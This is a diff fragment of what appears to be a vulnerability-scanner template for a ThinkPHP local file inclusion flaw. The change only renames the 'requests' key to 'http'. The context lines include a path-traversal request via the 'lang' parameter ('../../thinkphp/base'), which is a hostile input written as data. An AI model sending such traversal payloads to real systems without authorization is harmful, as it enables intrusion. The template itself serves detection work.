@@ -18,7 +18,7 @@ info:
     fofa-query: header="think_lang"
   tags: thinkphp,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?lang=../../thinkphp/base"
